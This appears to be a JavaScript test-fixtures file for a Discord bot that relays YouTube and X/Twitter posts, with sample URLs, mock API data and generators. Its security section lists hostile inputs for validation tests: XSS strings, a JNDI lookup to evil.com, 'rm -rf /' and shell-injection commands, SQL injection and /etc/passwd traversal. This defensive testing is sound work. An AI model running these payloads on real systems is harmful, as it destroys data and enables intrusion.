/**
 * Test data management and mock datasets for comprehensive testing
 * This file contains reusable test data, fixtures, and data generation utilities
 */

import { timestampUTC } from '../../src/utilities/utc-time.js';

export const testDatasets = {
  // YouTube video URLs in various formats for comprehensive regex testing
  youtubeUrls: {
    valid: [
      {
        url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
        expectedId: 'dQw4w9WgXcQ',
        type: 'watch',
        description: 'Standard YouTube watch URL',
      },
      {
        url: 'https://youtu.be/dQw4w9WgXcQ',
        expectedId: 'dQw4w9WgXcQ',
        type: 'short',
        description: 'YouTube short URL',
      },
      {
        url: 'https://www.youtube.com/shorts/dQw4w9WgXcQ',
        expectedId: 'dQw4w9WgXcQ',
        type: 'shorts',
        description: 'YouTube Shorts URL',
      },
      {
        url: 'https://youtube.com/embed/dQw4w9WgXcQ',
        expectedId: 'dQw4w9WgXcQ',
        type: 'embed',
        description: 'YouTube embed URL',
      },
      {
        url: 'https://www.youtube.com/live/dQw4w9WgXcQ',
        expectedId: 'dQw4w9WgXcQ',
        type: 'live',
        description: 'YouTube live URL',
      },
      {
        url: 'https://www.youtube.com/v/dQw4w9WgXcQ',
        expectedId: 'dQw4w9WgXcQ',
        type: 'v',
        description: 'YouTube v/ URL format',
      },
      {
        url: 'http://www.youtube.com/watch?v=dQw4w9WgXcQ&t=42s',
        expectedId: 'dQw4w9WgXcQ',
        type: 'watch_with_params',
        description: 'YouTube URL with timestamp parameter',
      },
      {
        url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ&list=PLrAXtmRdnEQy6nuLviYjIbjG1Bc8BzD8G',
        expectedId: 'dQw4w9WgXcQ',
        type: 'watch_with_playlist',
        description: 'YouTube URL with playlist parameter',
      },
    ],
    invalid: [
      {
        url: 'https://www.youtube.com/channel/UCuAXFkgsw1L7xaCfnd5JJOw',
        description: 'YouTube channel URL (not video)',
      },
      {
        url: 'https://www.youtube.com/user/rickastleyofficial',
        description: 'YouTube user URL (not video)',
      },
      {
        url: 'https://www.youtube.com/playlist?list=PLrAXtmRdnEQy6nuLviYjIbjG1Bc8BzD8G',
        description: 'YouTube playlist URL (not video)',
      },
      {
        url: 'https://www.youtube.com/watch?v=',
        description: 'Empty video ID',
      },
      {
        url: 'https://www.youtube.com/watch?v=short',
        description: 'Invalid video ID (too short)',
      },
      {
        url: 'https://not-youtube.com/watch?v=dQw4w9WgXcQ',
        description: 'Non-YouTube domain',
      },
    ],
    edgeCases: [
      {
        url: 'Check this out: https://www.youtube.com/watch?v=dQw4w9WgXcQ amazing!',
        expectedId: 'dQw4w9WgXcQ',
        description: 'URL embedded in text',
      },
      {
        url: 'Multiple videos: https://youtu.be/abc12345678 and https://www.youtube.com/watch?v=def98765432',
        expectedIds: ['abc12345678', 'def98765432'],
        description: 'Multiple URLs in one string',
      },
    ],
  },

  // X/Twitter URLs in various formats
  twitterUrls: {
    valid: [
      {
        url: 'https://x.com/user/status/1234567890123456789',
        expectedId: '1234567890123456789',
        platform: 'x.com',
        description: 'Standard X.com status URL',
      },
      {
        url: 'https://twitter.com/elonmusk/status/9876543210987654321',
        expectedId: '9876543210987654321',
        platform: 'twitter.com',
        description: 'Twitter.com status URL',
      },
      {
        url: 'https://vxtwitter.com/user/status/1111222233334444555',
        expectedId: '1111222233334444555',
        platform: 'vxtwitter.com',
        description: 'VX Twitter URL',
      },
      {
        url: 'https://fxtwitter.com/user/status/5555444433332222111',
        expectedId: '5555444433332222111',
        platform: 'fxtwitter.com',
        description: 'FX Twitter URL',
      },
      {
        url: 'https://nitter.net/user/status/9999888877776666555',
        expectedId: '9999888877776666555',
        platform: 'nitter.net',
        description: 'Nitter URL',
      },
      {
        url: 'https://x.com/i/web/status/1234567890123456789',
        expectedId: '1234567890123456789',
        platform: 'x.com',
        description: 'X.com i/web/status URL',
      },
      {
        url: 'https://mobile.twitter.com/user/status/1111111111111111111',
        expectedId: '1111111111111111111',
        platform: 'mobile.twitter.com',
        description: 'Mobile Twitter URL',
      },
    ],
    invalid: [
      {
        url: 'https://x.com/user',
        description: 'User profile URL (not status)',
      },
      {
        url: 'https://x.com/user/followers',
        description: 'User followers URL (not status)',
      },
      {
        url: 'https://twitter.com/user/media',
        description: 'User media URL (not status)',
      },
      {
        url: 'https://x.com/user/status/',
        description: 'Empty status ID',
      },
      {
        url: 'https://x.com/user/status/invalid',
        description: 'Invalid status ID (non-numeric)',
      },
      {
        url: 'https://not-twitter.com/user/status/123',
        description: 'Non-Twitter domain',
      },
    ],
    edgeCases: [
      {
        url: 'Check this tweet: https://x.com/user/status/1234567890123456789 cool!',
        expectedId: '1234567890123456789',
        description: 'URL embedded in text',
      },
      {
        url: 'Multiple tweets: https://x.com/user1/status/111 and https://twitter.com/user2/status/222',
        expectedIds: ['111', '222'],
        description: 'Multiple URLs in one string',
      },
    ],
  },

  // Mock video details for YouTube API responses
  videoDetails: {
    standard: {
      id: 'dQw4w9WgXcQ',
      snippet: {
        title: 'Rick Astley - Never Gonna Give You Up (Official Video)',
        description: 'The official video for "Never Gonna Give You Up" by Rick Astley',
        channelId: 'UCuAXFkgsw1L7xaCfnd5JJOw',
        channelTitle: 'Rick Astley',
        publishedAt: '2009-10-25T06:57:33Z',
        thumbnails: {
          default: { url: 'https://i.ytimg.com/vi/dQw4w9WgXcQ/default.jpg' },
          medium: { url: 'https://i.ytimg.com/vi/dQw4w9WgXcQ/mqdefault.jpg' },
          high: { url: 'https://i.ytimg.com/vi/dQw4w9WgXcQ/hqdefault.jpg' },
        },
        tags: ['Rick Astley', 'Never Gonna Give You Up', 'Official Video'],
        categoryId: '10',
        defaultLanguage: 'en',
        defaultAudioLanguage: 'en',
      },
      statistics: {
        viewCount: '1000000000',
        likeCount: '10000000',
        favoriteCount: '0',
        commentCount: '5000000',
      },
      contentDetails: {
        duration: 'PT3M33S',
        dimension: '2d',
        definition: 'hd',
        caption: 'false',
        licensedContent: true,
      },
    },
    livestream: {
      id: 'live123456789',
      snippet: {
        title: 'Live Stream: Test Channel Going Live',
        description: 'Welcome to our live stream!',
        channelId: 'UCtest123456789',
        channelTitle: 'Test Channel',
        publishedAt: new Date().toISOString(),
        liveBroadcastContent: 'live',
        thumbnails: {
          high: { url: 'https://i.ytimg.com/vi/live123456789/hqdefault_live.jpg' },
        },
      },
      liveStreamingDetails: {
        actualStartTime: new Date().toISOString(),
        scheduledStartTime: new Date(timestampUTC() - 300000).toISOString(), // 5 minutes ago
        concurrentViewers: '1000',
        activeLiveChatId: 'Cg0KC2xpdmUxMjM0NTY3ODk',
      },
      statistics: {
        viewCount: '1000',
        likeCount: '50',
      },
    },
    shorts: {
      id: 'shorts123456',
      snippet: {
        title: 'Funny Cat Video #Shorts',
        description: 'Hilarious cat compilation',
        channelId: 'UCshorts123456',
        channelTitle: 'Shorts Channel',
        publishedAt: new Date().toISOString(),
        thumbnails: {
          high: { url: 'https://i.ytimg.com/vi/shorts123456/hqdefault.jpg' },
        },
        tags: ['shorts', 'cat', 'funny'],
        categoryId: '23',
      },
      contentDetails: {
        duration: 'PT59S', // 59 seconds (Shorts are under 60s)
        dimension: '2d',
        definition: 'hd',
      },
    },
  },

  // Mock tweet data for X/Twitter scraping
  tweetData: {
    post: {
      id: '1234567890123456789',
      text: 'Just posted a new video! Check it out: https://youtu.be/dQw4w9WgXcQ',
      user: {
        id: '987654321',
        username: 'testuser',
        displayName: 'Test User',
        verified: false,
        profileImageUrl: 'https://pbs.twimg.com/profile_images/123/avatar.jpg',
      },
      createdAt: new Date().toISOString(),
      metrics: {
        retweets: 42,
        likes: 150,
        replies: 23,
        quotes: 8,
      },
      media: [],
      urls: ['https://youtu.be/dQw4w9WgXcQ'],
      hashtags: ['video', 'content'],
      mentions: [],
      type: 'post',
    },
    reply: {
      id: '1111222233334444555',
      text: '@testuser Great video! Thanks for sharing 👍',
      user: {
        id: '555666777',
        username: 'replier',
        displayName: 'Reply User',
        verified: false,
      },
      createdAt: new Date().toISOString(),
      replyTo: {
        id: '1234567890123456789',
        user: { username: 'testuser' },
      },
      metrics: {
        retweets: 2,
        likes: 15,
        replies: 1,
        quotes: 0,
      },
      type: 'reply',
    },
    quote: {
      id: '2222333344445555666',
      text: 'This is exactly what I was looking for!',
      user: {
        id: '777888999',
        username: 'quoter',
        displayName: 'Quote User',
        verified: true,
      },
      createdAt: new Date().toISOString(),
      quotedTweet: {
        id: '1234567890123456789',
        text: 'Just posted a new video!',
        user: {
          username: 'testuser',
          displayName: 'Test User',
        },
      },
      metrics: {
        retweets: 8,
        likes: 45,
        replies: 5,
        quotes: 2,
      },
      type: 'quote',
    },
    retweet: {
      id: '3333444455556666777',
      user: {
        id: 'retweeter123',
        username: 'retweeter',
        displayName: 'Retweet User',
        verified: false,
      },
      createdAt: new Date().toISOString(),
      originalTweet: {
        id: '1234567890123456789',
        text: 'Just posted a new video! Check it out: https://youtu.be/dQw4w9WgXcQ',
        user: {
          username: 'testuser',
          displayName: 'Test User',
        },
      },
      type: 'retweet',
    },
  },

  // Discord message test data
  discordMessages: {
    command: {
      content: '!health',
      author: {
        id: '123456789012345678',
        username: 'testuser',
        discriminator: '1234',
        bot: false,
      },
      channel: {
        id: 'support-channel-id',
        name: 'support',
        type: 0, // GUILD_TEXT
      },
      timestamp: new Date().toISOString(),
    },
    announcement: {
      content: 'New video announcement',
      embeds: [
        {
          title: '🎥 New Video: Test Video',
          url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
          author: { name: 'Test Channel' },
          description: 'Check out this amazing new video!',
          thumbnail: { url: 'https://i.ytimg.com/vi/dQw4w9WgXcQ/hqdefault.jpg' },
          color: 0xff0000,
          timestamp: new Date().toISOString(),
          footer: { text: 'YouTube' },
        },
      ],
    },
    urlDetection: {
      content:
        'Check out this video: https://www.youtube.com/watch?v=dQw4w9WgXcQ and this tweet: https://x.com/user/status/1234567890123456789',
      author: {
        id: '987654321098765432',
        username: 'urlsharer',
        bot: false,
      },
    },
  },

  // PubSubHubbub notification test data
  pubsubNotifications: {
    newVideo: `<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns:yt="http://www.youtube.com/xml/schemas/2015" xmlns="http://www.w3.org/2005/Atom">
  <link rel="hub" href="https://pubsubhubbub.appspot.com"/>
  <link rel="self" href="https://www.youtube.com/xml/feeds/videos.xml?channel_id=UCuAXFkgsw1L7xaCfnd5JJOw"/>
  <title>YouTube video feed</title>
  <updated>2024-01-01T12:00:00+00:00</updated>
  <entry>
    <id>yt:video:dQw4w9WgXcQ</id>
    <yt:videoId>dQw4w9WgXcQ</yt:videoId>
    <yt:channelId>UCuAXFkgsw1L7xaCfnd5JJOw</yt:channelId>
    <title>Rick Astley - Never Gonna Give You Up (Official Video)</title>
    <link rel="alternate" href="https://www.youtube.com/watch?v=dQw4w9WgXcQ"/>
    <author>
      <name>Rick Astley</name>
      <uri>https://www.youtube.com/channel/UCuAXFkgsw1L7xaCfnd5JJOw</uri>
    </author>
    <published>2024-01-01T12:00:00+00:00</published>
    <updated>2024-01-01T12:00:00+00:00</updated>
  </entry>
</feed>`,
    livestream: `<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns:yt="http://www.youtube.com/xml/schemas/2015" xmlns="http://www.w3.org/2005/Atom">
  <link rel="hub" href="https://pubsubhubbub.appspot.com"/>
  <link rel="self" href="https://www.youtube.com/xml/feeds/videos.xml?channel_id=UCtest123456789"/>
  <title>YouTube video feed</title>
  <updated>2024-01-01T15:00:00+00:00</updated>
  <entry>
    <id>yt:video:live123456789</id>
    <yt:videoId>live123456789</yt:videoId>
    <yt:channelId>UCtest123456789</yt:channelId>
    <title>🔴 LIVE: Test Stream</title>
    <link rel="alternate" href="https://www.youtube.com/watch?v=live123456789"/>
    <author>
      <name>Test Channel</name>
      <uri>https://www.youtube.com/channel/UCtest123456789</uri>
    </author>
    <published>2024-01-01T15:00:00+00:00</published>
    <updated>2024-01-01T15:00:00+00:00</updated>
  </entry>
</feed>`,
  },

  // Environment configuration test data
  environmentConfigs: {
    valid: {
      DISCORD_BOT_TOKEN: 'TEST.FAKE.DISCORD-BOT-TOKEN-FOR-TESTING-ONLY',
      YOUTUBE_API_KEY: 'AIzaSyExample-API-Key-Here',
      YOUTUBE_CHANNEL_ID: 'UCuAXFkgsw1L7xaCfnd5JJOw',
      DISCORD_YOUTUBE_CHANNEL_ID: '123456789012345678',
      PSH_CALLBACK_URL: 'https://example.com/webhook/youtube',
      X_USER_HANDLE: 'testuser',
      DISCORD_X_POSTS_CHANNEL_ID: '234567890123456789',
      DISCORD_X_REPLIES_CHANNEL_ID: '345678901234567890',
      DISCORD_X_QUOTES_CHANNEL_ID: '456789012345678901',
      DISCORD_X_RETWEETS_CHANNEL_ID: '567890123456789012',
      TWITTER_USERNAME: 'testuser',
      TWITTER_PASSWORD: 'secure-password-123',
      DISCORD_BOT_SUPPORT_LOG_CHANNEL: '678901234567890123',
      COMMAND_PREFIX: '!',
      PSH_PORT: '3000',
      LOG_LEVEL: 'info',
      PSH_SECRET: 'super-secure-webhook-secret-key-64-chars-long-for-security',
      ANNOUNCEMENT_ENABLED: 'true',
      X_VX_TWITTER_CONVERSION: 'false',
      ALLOWED_USER_IDS: '123456789012345678,987654321098765432',
    },
    missing: {
      // Missing required variables
      YOUTUBE_API_KEY: 'AIzaSyExample-API-Key-Here',
      DISCORD_YOUTUBE_CHANNEL_ID: '123456789012345678',
      // Other required vars missing
    },
    invalid: {
      DISCORD_BOT_TOKEN: 'invalid-token',
      YOUTUBE_CHANNEL_ID: 'invalid-channel-id',
      DISCORD_YOUTUBE_CHANNEL_ID: '123', // Too short
      PSH_CALLBACK_URL: 'http://insecure.com/webhook',
      PSH_PORT: '99999', // Invalid port
      LOG_LEVEL: 'invalid-level',
      ALLOWED_USER_IDS: 'not-numeric-ids',
    },
  },

  // Performance test data
  performance: {
    // Large dataset for memory and performance testing
    largeUrlSet(size = 10000) {
      const urls = [];
      for (let i = 0; i < size; i++) {
        urls.push(`https://www.youtube.com/watch?v=test${i.toString().padStart(7, '0')}`);
        urls.push(`https://x.com/user/status/${1000000000000000000 + i}`);
      }
      return urls;
    },

    // Complex duplicate detection test set
    duplicateTestSet(uniqueCount = 1000, duplicatesPerUnique = 5) {
      const urls = [];
      for (let i = 0; i < uniqueCount; i++) {
        const videoId = `video${i.toString().padStart(7, '0')}`;
        const tweetId = (1000000000000000000 + i).toString();

        // Add original URLs
        urls.push(`https://www.youtube.com/watch?v=${videoId}`);
        urls.push(`https://x.com/user/status/${tweetId}`);

        // Add duplicates in different formats
        for (let j = 0; j < duplicatesPerUnique; j++) {
          urls.push(`https://youtu.be/${videoId}`);
          urls.push(`https://youtube.com/shorts/${videoId}`);
          urls.push(`https://twitter.com/user/status/${tweetId}`);
          urls.push(`https://vxtwitter.com/user/status/${tweetId}`);
        }
      }
      return urls;
    },
  },

  // Security test data
  security: {
    maliciousInputs: [
      '<script>alert("XSS")</script>',
      '<iframe src="javascript:alert(1)"></iframe>',
      'javascript:alert("XSS")',
      '<img src="x" onerror="alert(1)">',
      '"><script>alert(1)</script>',
      'data:text/html,<script>alert(1)</script>',
      '../../../etc/passwd',
      'http://localhost:8080/admin',
      'file:///etc/passwd',
      'ftp://internal.server/file',
      '${jndi:ldap://evil.com/exploit}',
      'eval(process.exit(1))',
      'require("child_process").exec("rm -rf /")',
      'DROP TABLE users;',
      "'; DROP TABLE users; --",
      '{{7*7}}', // Template injection
      '%{#context.stop()}', // OGNL injection
      '__import__("os").system("whoami")', // Python injection
    ],

    validInputs: [
      'Hello world!',
      'Check out this video: https://youtube.com/watch?v=abc123',
      'New tweet: https://x.com/user/status/123456789',
      'Normal message with emojis 🎉🎊',
      'Message with numbers 123 and symbols !@#$%',
      'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
      'https://x.com/user/status/1234567890123456789',
    ],

    suspiciousPatterns: {
      sqlInjection: [
        "' OR '1'='1",
        '" OR "1"="1',
        '; DROP TABLE users; --',
        "' UNION SELECT * FROM users --",
        '1; UPDATE users SET password="hacked"',
      ],

      commandInjection: ['|whoami', ';cat /etc/passwd', '`id`', '$(whoami)', '&& rm -rf /', '|| echo "hacked"'],

      pathTraversal: [
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        '....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252fetc%252fpasswd',
      ],
    },
  },
};

// Data generation utilities
export const dataGenerators = {
  // Generate realistic Discord channel IDs (snowflakes)
  generateDiscordId: () => {
    const timestamp = timestampUTC() - 1420070400000; // Discord epoch
    const randomBits = Math.floor(Math.random() * 4095); // 12 bits
    return ((timestamp << 22) | randomBits).toString();
  },

  // Generate YouTube video IDs
  generateYouTubeId: () => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-';
    return Array.from({ length: 11 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
  },

  // Generate Twitter/X status IDs
  generateTwitterId: () => {
    return (1000000000000000000n + BigInt(Math.floor(Math.random() * 1000000000000000000))).toString();
  },

  // Generate realistic timestamps
  generateTimestamp: (daysAgo = 0) => {
    const date = new Date();
    date.setDate(date.getDate() - daysAgo);
    return date.toISOString();
  },

  // Generate test user data
  generateUser: (overrides = {}) => ({
    id: dataGenerators.generateDiscordId(),
    username: `testuser${Math.floor(Math.random() * 10000)}`,
    discriminator: Math.floor(Math.random() * 9999)
      .toString()
      .padStart(4, '0'),
    bot: false,
    ...overrides,
  }),

  // Generate test video data
  generateVideoData: (overrides = {}) => ({
    id: dataGenerators.generateYouTubeId(),
    snippet: {
      title: `Test Video ${Math.floor(Math.random() * 10000)}`,
      description: 'Generated test video description',
      channelId: `UC${dataGenerators.generateYouTubeId().substring(0, 22)}`,
      channelTitle: `Test Channel ${Math.floor(Math.random() * 1000)}`,
      publishedAt: dataGenerators.generateTimestamp(),
      thumbnails: {
        high: { url: `https://i.ytimg.com/vi/${dataGenerators.generateYouTubeId()}/hqdefault.jpg` },
      },
      tags: ['test', 'generated', 'video'],
      categoryId: '22',
    },
    statistics: {
      viewCount: Math.floor(Math.random() * 1000000).toString(),
      likeCount: Math.floor(Math.random() * 10000).toString(),
      commentCount: Math.floor(Math.random() * 1000).toString(),
    },
    ...overrides,
  }),

  // Generate test tweet data
  generateTweetData: (overrides = {}) => ({
    id: dataGenerators.generateTwitterId(),
    text: `Generated test tweet ${Math.floor(Math.random() * 10000)}`,
    user: {
      id: Math.floor(Math.random() * 1000000000).toString(),
      username: `testuser${Math.floor(Math.random() * 10000)}`,
      displayName: `Test User ${Math.floor(Math.random() * 1000)}`,
      verified: Math.random() > 0.9,
    },
    createdAt: dataGenerators.generateTimestamp(),
    metrics: {
      retweets: Math.floor(Math.random() * 100),
      likes: Math.floor(Math.random() * 1000),
      replies: Math.floor(Math.random() * 50),
      quotes: Math.floor(Math.random() * 20),
    },
    media: [],
    urls: [],
    hashtags: [],
    mentions: [],
    ...overrides,
  }),

  // Generate batch test data
  generateBatch: (generator, count, overrideFn = null) => {
    return Array.from({ length: count }, (_, index) => {
      const overrides = overrideFn ? overrideFn(index) : {};
      return generator(overrides);
    });
  },
};

// Test scenario builders
export const testScenarios = {
  // Build a complete announcement workflow scenario
  buildAnnouncementWorkflow: (videoData, tweetData) => ({
    trigger: {
      type: 'pubsub_notification',
      videoId: videoData.id,
      channelId: videoData.snippet.channelId,
      timestamp: new Date().toISOString(),
    },
    videoDetails: videoData,
    expectedAnnouncement: {
      platform: 'discord',
      channelId: 'youtube-channel-id',
      content: {
        embeds: [
          {
            title: `🎥 New Video: ${videoData.snippet.title}`,
            url: `https://www.youtube.com/watch?v=${videoData.id}`,
            author: { name: videoData.snippet.channelTitle },
            thumbnail: { url: videoData.snippet.thumbnails.high.url },
            color: 0xff0000,
          },
        ],
      },
    },
    twitterContent: tweetData,
    expectedTwitterAnnouncement: {
      platform: 'discord',
      channelId: 'x-posts-channel-id',
      content: `**New Post from @${tweetData.user.username}:**\n\n${tweetData.text}\n\nhttps://x.com/${tweetData.user.username}/status/${tweetData.id}`,
    },
  }),

  // Build a duplicate detection scenario
  buildDuplicateScenario: (baseVideoId, baseTweetId) => ({
    originalUrls: [`https://www.youtube.com/watch?v=${baseVideoId}`, `https://x.com/user/status/${baseTweetId}`],
    duplicateUrls: [
      `https://youtu.be/${baseVideoId}`,
      `https://youtube.com/shorts/${baseVideoId}`,
      `https://www.youtube.com/embed/${baseVideoId}`,
      `https://twitter.com/user/status/${baseTweetId}`,
      `https://vxtwitter.com/user/status/${baseTweetId}`,
      `https://fxtwitter.com/user/status/${baseTweetId}`,
    ],
    expectedUniqueIds: {
      videos: [baseVideoId],
      tweets: [baseTweetId],
    },
    expectedDuplicateCount: 5, // 3 video duplicates + 2 tweet duplicates
  }),

  // Build a performance test scenario
  buildPerformanceScenario: (scale = 'medium') => {
    const scales = {
      small: { videos: 1000, tweets: 1000, duplicateRatio: 0.2 },
      medium: { videos: 10000, tweets: 10000, duplicateRatio: 0.3 },
      large: { videos: 50000, tweets: 50000, duplicateRatio: 0.4 },
      xlarge: { videos: 100000, tweets: 100000, duplicateRatio: 0.5 },
    };

    const config = scales[scale] || scales.medium;

    return {
      config,
      testUrls: testDatasets.performance.largeUrlSet(config.videos + config.tweets),
      duplicateUrls: testDatasets.performance.duplicateTestSet(
        Math.floor(config.videos * (1 - config.duplicateRatio)),
        Math.floor(config.duplicateRatio * 5)
      ),
      expectedMetrics: {
        processingTime: scale === 'large' ? 5000 : 2000, // ms
        memoryUsage: scale === 'large' ? 100 * 1024 * 1024 : 50 * 1024 * 1024, // bytes
        throughput: scale === 'large' ? 10000 : 20000, // items/second
      },
    };
  },
};

export default {
  testDatasets,
  dataGenerators,
  testScenarios,
};
